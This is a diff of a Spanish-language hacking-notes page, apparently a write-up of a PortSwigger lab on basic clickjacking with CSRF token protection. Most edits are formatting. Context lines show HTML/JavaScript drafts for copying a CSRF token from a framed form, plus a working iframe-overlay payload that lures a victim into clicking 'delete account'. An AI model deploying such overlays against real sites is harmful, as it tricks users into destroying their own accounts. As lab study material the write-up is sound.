@@ -4,13 +4,13 @@
 
 <summary>👁️ RECONOCIMIENTO PASIVO ✔️</summary>
 
-### AUDITORIA DE: ((Laboratorio: Clickjacking básico con protección de token CSRF))
+#### AUDITORIA DE: ((Laboratorio: Clickjacking básico con protección de token CSRF))
 
 ***
 
 ***
 
-#### RECONOCIMIENTO PASIVO
+**RECONOCIMIENTO PASIVO**
 
 *   [x] BROWSER👈 --------------------------------->[https://www.paimon.com.ar/](https://www.google.com/)
 
@@ -24,11 +24,9 @@
     </form>
     ```
 
-    ![CLICKHACKING_con_CSRF_FORMULARIO_LOGIN](https://github.com/MammaniNelsonD/P4IM0N_H4CKING/assets/114308492/4e953769-ff57-49c0-946f-451b72ac9d12)
+    ![CLICKHACKING\_con\_CSRF\_FORMULARIO\_LOGIN](https://github.com/MammaniNelsonD/P4IM0N\_H4CKING/assets/114308492/4e953769-ff57-49c0-946f-451b72ac9d12)
 
-    ![CLICKHACKING_con_CSRF_FORMULARIO_DELETE](https://github.com/MammaniNelsonD/P4IM0N_H4CKING/assets/114308492/2d7470c8-6437-4e50-a215-35415f9473e6)
-
-
+    ![CLICKHACKING\_con\_CSRF\_FORMULARIO\_DELETE](https://github.com/MammaniNelsonD/P4IM0N\_H4CKING/assets/114308492/2d7470c8-6437-4e50-a215-35415f9473e6)
 
     * CONCLUSION: VEMOS LAS PROTECCIONES CSRF CON LA QUE CUENTAN LOS FIORMULARIOS DE INICIO DE SESION Y EL BOTON DEL FORMULARIO PARA BORRAR LA CUENTA.
 *   [ ] BROWSER👈 --------------------------------->[https://www.paimon.com.ar/](https://www.google.com/)
@@ -233,7 +231,7 @@
 
 <summary>🔬 ANALISIS FORENSE ❌</summary>
 
-#### ANALISIS FORENSE
+**ANALISIS FORENSE**
 
 *   [ ] AUTOPSY👈 [https://tools.kali.org/forensics/autopsy](https://tools.kali.org/forensics/autopsy)--->[PDF-TOOL](../../../manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/autopsy-digital-forensics.md)
 
@@ -430,7 +428,7 @@
 
 <summary>👊 RECONOCIMIENTO ACTIVO ❌</summary>
 
-#### RECONOCIMIENTO ACTIVO
+**RECONOCIMIENTO ACTIVO**
 
 *   [ ] PING👈 --------------------------------->[https://www.kali.org/tools/fping/](https://www.kali.org/tools/fping/)
 
@@ -865,7 +863,7 @@
 
 <summary>🕵️ INVESTIGACION OSINT ❌</summary>
 
-#### INVESTIGACION OSINT
+**INVESTIGACION OSINT**
 
 *   [ ] OSINT Framework👈 --------------------------------->[https://osintframework.com/](https://osintframework.com/)
 
@@ -1062,7 +1060,7 @@
 
 <summary>⛓️ HASHES Y DESENCRIPTADOS ❌</summary>
 
-#### HASHES Y DESENCRIPTADOS
+**HASHES Y DESENCRIPTADOS**
 
 *   [ ] JOHN THE RIPPER👈 --------------------------------->[https://www.kali.org/tools/john/ ](https://www.kali.org/tools/john/)--->[PDF-TOOL](https://paimonhacking.gitbook.io/p4im0n\_h4cking/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/john-the-ripper)
 
@@ -1287,7 +1285,7 @@
 
 <summary>💪 FUERZA BRUTA A LOGINS ❌</summary>
 
-#### FUERZA BRUTA A LOGINS
+**FUERZA BRUTA A LOGINS**
 
 *   [ ] HYDRA👈 --------------------------------->[https://www.kali.org/tools/hydra/ ](https://www.kali.org/tools/hydra/)--->[PDF-TOOL](https://paimonhacking.gitbook.io/p4im0n\_h4cking/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/hydra-fuerza-bruta)
 
@@ -1449,7 +1447,7 @@
 
 <summary>🛠️ SCRIPT DE EXPLOIT Y PAYLOADS ✔️</summary>
 
-#### SCRIPT DE EXPLOIT Y PAYLOADS
+**SCRIPT DE EXPLOIT Y PAYLOADS**
 
 *   [ ] METASPLOIT👈 --------------------------------->[https://www.metasploit.com/ ](https://www.metasploit.com/)--->[PDF-TOOL](../../../manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/metasploit.md)
 
@@ -1584,7 +1582,7 @@
             <!-- Campo oculto para almacenar el token CSRF -->
             <input type="hidden" name="csrf" id="csrfToken" value="" />
         </form>
-    
+
         <script>
             // Función para extraer el token CSRF del formulario original
             function obtenerTokenCSRF() {
@@ -1594,7 +1592,7 @@
                 var csrfToken = form.elements['csrf'].value;
                 return csrfToken;
             }
-    
+
             // Función para asignar el token CSRF al campo oculto en el nuevo formulario
             function asignarTokenCSRF() {
                 var csrfToken = obtenerTokenCSRF();
@@ -1603,7 +1601,7 @@
                 // Asigna el valor del token CSRF al campo oculto en el nuevo formulario
                 nuevoForm.elements['csrf'].value = csrfToken;
             }
-    
+
             // Llama a la función para asignar el token CSRF cuando se carga la página
             window.onload = function() {
                 asignarTokenCSRF();
@@ -1613,13 +1611,13 @@
         </script>
     </body>
     </html>
-    
-    
-    
+
+
+
     -------
-    
-    
-    
+
+
+
     <!DOCTYPE html>
     <html>
     <head>
@@ -1633,7 +1631,7 @@
         
         <!-- Contenedor del iframe para mostrar el sitio web de la cuenta -->
         <iframe src="https://0aa40055049ae73e8218067900cd0052.web-security-academy.net/my-account" style="display:none;" id="accountFrame"></iframe>
-    
+
         <script>
             // Función para eliminar la cuenta simulada
             function eliminarCuenta() {
@@ -1645,16 +1643,16 @@
         </script>
     </body>
     </html>
-    
-    
-    
-    
+
+
+
+
     ----------
-    
-    
-    
-    
-    
+
+
+
+
+
     <!DOCTYPE html>
     <html>
     <head>
@@ -1672,16 +1670,16 @@
         </script>
     </body>
     </html>
-    
-    
+
+
     -----------
     PAYLOAD QUE FUNCIONO:
 
-    
+
     PRIMERO TARBAJAMOS SOBRE EL IFRAME DE NUESTRO WSUUARIO WIENER PARA CALCULAR LA POSICION DEL SUPUESTO BOTON DE CLICKHACKIN DE NEUSTRO DIV:
-    
-    
-    
+
+
+
     <style>
         iframe {
             position:relative;
@@ -1699,12 +1697,12 @@
     </style>
     <div>Click me</div>
     <iframe src="https://0aa40055049ae73e8218067900cd0052.web-security-academy.net/my-account"></iframe>
-    
+
     ```
-    ![CLICKHACKING_con_CSRF_POSICIONANDO_EL_BOTON_OCULTO](https://github.com/MammaniNelsonD/P4IM0N_H4CKING/assets/114308492/14b98b10-c926-45c4-a674-dde36382fc64)
 
+    ![CLICKHACKING\_con\_CSRF\_POSICIONANDO\_EL\_BOTON\_OCULTO](https://github.com/MammaniNelsonD/P4IM0N\_H4CKING/assets/114308492/14b98b10-c926-45c4-a674-dde36382fc64)
 
-    * CONCLUSION:LUEGO DE COLOCAR NUESTRO BOTON PARA QUE SE PRODUSCA EL CLICKHACKING DEL USUARIO PENSANDO QUE ESTA HACIENDO CLICK EN ALGUN OTRO BODY QUE LE PONGAMOS DE FONDO (EJEMPLO UN PREMIO CON UN SUPUESTO BOTON EN EL DIV, QUE NOSOTROS ACOMODAMOS CON SU POSITION SOBRE EL IFRAME DEL ACOUNT DEL SITIO WEB QUE AL HACER CLICK EN EL LINK L USUARIO LO LLEVARA DIRECTAMENTE A SU ACOUNT OSEA A SU PERFIL DADO QUE SERIA COMO UNA RUTA RLATIVA QUE SE CARGARA CON SU PERFIL POR QUE  EL Y AESTARIA CON SUS COOKIES; Y COMO NOSOSTROS POSICIONAMOS NEUSTRO DIV (BOTON) SIMULANDO SER UN PREMIO, SOBRE EL BOTON DE ELIMINAR CUENTA DE SU PERFIL; EL MISMO SIN DARCE CUENTA ESTARA HACIENDO CLICK ELIMINANDOCE EL MISMO, EXPLOTANDOCE ESTA VULNERABILIDAD DE CLICKHACKING CON CSRF DADO QUE SE ESTA CARGANDO DEL LADO DEL USUARIO VICTIMA EN EL IFRAME DEL SITIO.
+    * CONCLUSION:LUEGO DE COLOCAR NUESTRO BOTON PARA QUE SE PRODUSCA EL CLICKHACKING DEL USUARIO PENSANDO QUE ESTA HACIENDO CLICK EN ALGUN OTRO BODY QUE LE PONGAMOS DE FONDO (EJEMPLO UN PREMIO CON UN SUPUESTO BOTON EN EL DIV, QUE NOSOTROS ACOMODAMOS CON SU POSITION SOBRE EL IFRAME DEL ACOUNT DEL SITIO WEB QUE AL HACER CLICK EN EL LINK L USUARIO LO LLEVARA DIRECTAMENTE A SU ACOUNT OSEA A SU PERFIL DADO QUE SERIA COMO UNA RUTA RLATIVA QUE SE CARGARA CON SU PERFIL POR QUE EL Y AESTARIA CON SUS COOKIES; Y COMO NOSOSTROS POSICIONAMOS NEUSTRO DIV (BOTON) SIMULANDO SER UN PREMIO, SOBRE EL BOTON DE ELIMINAR CUENTA DE SU PERFIL; EL MISMO SIN DARCE CUENTA ESTARA HACIENDO CLICK ELIMINANDOCE EL MISMO, EXPLOTANDOCE ESTA VULNERABILIDAD DE CLICKHACKING CON CSRF DADO QUE SE ESTA CARGANDO DEL LADO DEL USUARIO VICTIMA EN EL IFRAME DEL SITIO.
 *   [ ] COMPLETAR...👈 --------------------------------->[https://www.paimon.com.ar/](https://www.google.com/)
 
     ```python
@@ -1725,7 +1723,7 @@
 
 <summary>🤯 EXPLOTACION ✔️</summary>
 
-#### EXPLOTACION
+**EXPLOTACION**
 
 *   [x] BURP SUITE👈 --------------------------------->[https://portswigger.net/web-security ](https://portswigger.net/web-security)--->[PDF-TOOL](../../../manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/burpsuite.md)
 
@@ -1937,7 +1935,7 @@
 
 <summary>💠 ESCALADA DE PRIVILEGIOS WINDOWS ❌</summary>
 
-#### ESCALADA DE PRIVILEGIOS WINDOWS
+**ESCALADA DE PRIVILEGIOS WINDOWS**
 
 *   [ ] NETCAT👈 --------------------------------->[https://www.kali.org/tools/netcat/ ](https://www.kali.org/tools/netcat/)--->[PDF-TOOL](../../../manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/netcat-conexiones.md)
 
@@ -2197,7 +2195,7 @@
 
 <summary>🐧 ESCALADA DE PRIVILEGIOS LINUX ❌</summary>
 
-#### ESCALADA DE PRIVILEGIOS LINUX
+**ESCALADA DE PRIVILEGIOS LINUX**
 
 *   [ ] NETCAT👈 --------------------------------->[https://www.kali.org/tools/netcat/ ](https://www.kali.org/tools/netcat/)--->[PDF-TOOL](../../../manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/netcat-conexiones.md)
 
@@ -2422,7 +2420,7 @@
 
 <summary>♻️ PIVOTING ❌</summary>
 
-#### PIVOTING
+**PIVOTING**
 
 *   [ ] SSH TUNNELS👈 --------------------------------->[https://www.openssh.com/](https://www.openssh.com/)--->[PDF-TOOL](../../../manuales-de-tools-en-pdf-y-mas/libros-y-mas-pdf/port-forwarding-and-tunnelling-cheatsheet.md)
 
